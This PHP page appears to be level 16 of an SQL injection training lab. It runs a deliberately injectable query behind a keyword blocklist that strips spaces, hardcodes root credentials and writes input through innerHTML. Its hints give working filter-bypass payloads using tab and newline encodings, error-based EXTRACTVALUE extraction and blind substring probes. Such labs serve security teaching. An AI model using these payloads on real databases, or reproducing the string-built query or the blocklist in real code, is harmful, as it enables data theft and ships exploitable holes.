<?php
$mysqli = new mysqli('db','root','rootpassword','sqli_lab');
$id = $_GET['id'] ?? '';

if ($id !== '') {
    $id_no_space = str_replace(' ', '', $id);
    $blocked_keywords = ['union', 'select', 'or', 'and', 'where', 'from'];
    $id_lower = strtolower($id_no_space);

    $blocked = false;
    foreach ($blocked_keywords as $keyword) {
        if (strpos($id_lower, $keyword) !== false) {
            $blocked = true;
            break;
        }
    }

    if (!$blocked) {
        $sql = "SELECT username FROM users WHERE id = $id";
        $result = $mysqli->query($sql);

        if (!$result) {
            die('Error: '.$mysqli->error);
        }

        $row = $result->fetch_row();
        if ($row) {
            echo htmlspecialchars($row[0]);
        } else {
            echo 'No user found';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 16 - Space Filter Bypass</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 Level 16 - Space Filter Bypass</h1>
            <p><strong>Attack Type:</strong> Bypass filters that remove spaces by using alternative whitespace characters</p>
        </div>

        <div class="form-container">
            <h3>Current Query:</h3>
            <div class="code-block">SELECT username FROM users WHERE id = <?php echo htmlspecialchars($_GET['id'] ?? 'NULL'); ?></div>
            
            <h3>🚨 Filter Rules:</h3>
            <div class="waf-warning">
                <strong>Process:</strong> Remove all spaces → Check blocked keywords<br>
                <strong>Blocked keywords:</strong> union, select, or, and, where, from
            </div>
            
            <?php
            if (isset($_GET['id']) && $_GET['id'] !== '') {
                $id = $_GET['id'];
                $id_no_space = str_replace(' ', '', $id);
                
                echo '<h3>Result:</h3>';
                echo '<div class="result">';
                echo '<p><strong>Original input:</strong> ' . htmlspecialchars($id) . '</p>';
                echo '<p><strong>After space removal:</strong> ' . htmlspecialchars($id_no_space) . '</p>';
                
                $blocked_keywords = ['union', 'select', 'or', 'and', 'where', 'from'];
                $id_lower = strtolower($id_no_space);

                $blocked = false;
                $blocked_keyword = '';
                foreach ($blocked_keywords as $keyword) {
                    if (strpos($id_lower, $keyword) !== false) {
                        $blocked = true;
                        $blocked_keyword = $keyword;
                        break;
                    }
                }

                if ($blocked) {
                    echo '<div class="error">🚨 Filter blocked: Keyword detected: ' . $blocked_keyword . '</div>';
                } else {
                    $mysqli = new mysqli('db','root','rootpassword','sqli_lab');
                    $sql = "SELECT username FROM users WHERE id = $id";
                    $result = $mysqli->query($sql);

                    if (!$result) {
                        echo '<div class="error">Error: '.$mysqli->error.'</div>';
                    } else {
                        $row = $result->fetch_row();
                        if ($row) {
                            echo '<strong>Username:</strong> ' . htmlspecialchars($row[0]);
                        } else {
                            echo 'No user found';
                        }
                    }
                }
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Own Payload:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="id">ID Parameter:</label>
                    <input type="text" id="id" name="id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>" placeholder="Enter your payload here..." oninput="updateQuery()">
                </div>
                <button type="submit" class="btn">🚀 Execute Query</button>
            </form>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding Space Filtering</h4>
                    <p>The filter removes all regular spaces before checking for keywords.</p>
                    <p>Try: <code>1 union select</code> - Becomes "1unionselect" and gets blocked.</p>
                    <p>We need alternative whitespace characters.</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Alternative Whitespace Characters</h4>
                    <p>MySQL treats various characters as whitespace:</p>
                    <p>• Tab character: <code>%09</code></p>
                    <p>• Line feed: <code>%0a</code></p>
                    <p>• Carriage return: <code>%0d</code></p>
                    <p>Try: <code>1%09union%09select</code></p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Using Tab Characters</h4>
                    <p>Use tab characters instead of spaces:</p>
                    <p>Try: <code>1%09||%09(ASCII(MID((DATABASE()),1,1))>100)</code></p>
                    <p>The %09 (tab) won't be removed by the space filter.</p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Combining Multiple Techniques</h4>
                    <p>Use parentheses and alternative whitespace:</p>
                    <p>Try: <code>1%0a||%0a(EXTRACTVALUE(1,CONCAT(0x7e,(DATABASE()),0x7e)))</code></p>
                    <p>%0a is line feed character that MySQL accepts as whitespace.</p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>🎯 Final Payload</h4>
                    <p>Extract the flag using alternative whitespace:</p>
                    <p><code>-1%09||%09EXTRACTVALUE(1,CONCAT(0x7e,(MID((MID((DATABASE()),1,100)),1,50)),0x7e))</code></p>
                    <p>For level 16 flag specifically:</p>
                    <p><code>1%0a||%0a(ASCII(SUBSTRING((SELECT(flag)FROM(levels)WHERE(id=16)),1,1))>70)</code></p>
                    <p>Alternative with line breaks:</p>
                    <p><code>1%0d||%0dEXTRACTVALUE(1,CONCAT(0x7e,(SELECT(flag)FROM(levels)WHERE(id=16)),0x7e))</code></p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="index.php">🏠 Home</a>
            <a href="level15.php">⬅️ Previous Level</a>
            <a href="submit.php?level=16">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 5;

    function updateQuery() {
        const input = document.getElementById('id').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = 'SELECT username FROM users WHERE id = ' + (input || 'NULL');
    }

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').style.display = 'none';
            }
        }
    }
    </script>
</body>
</html>
